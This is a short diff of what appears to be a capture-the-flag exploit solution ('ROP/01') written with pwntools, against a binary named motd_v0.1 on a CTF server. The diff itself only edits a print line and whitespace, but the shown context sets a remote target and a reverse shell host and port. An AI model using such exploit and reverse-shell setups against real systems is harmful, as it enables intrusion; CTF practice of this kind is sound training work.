@@ -3,7 +3,7 @@ from pwn import *
 from struct import pack
 def q(addr): return pack('<Q', addr)
 
-print "=== ROP/01: Solution ===\n"
+print "=== ROP/01: Solution ==="
 """
 Explanation:
     This is a classical stack smash, but there's no gadget to jump to the stack.
@@ -34,7 +34,7 @@ Explanation:
 REMOTE = ('ctf.segfault.me', 3001) # Remote to exploit or None
 # REMOTE = None
 TARGET = '../bin/motd_v0.1' # Local binary path (must be identical on server)
-LHOST  = "10.0.0.105"        # Reverse shell host
+LHOST  = "10.0.0.105"       # Reverse shell host
 LPORT  = "8888"             # Reverse shell port
 DEBUG  = False              # Follow along in GDB
 
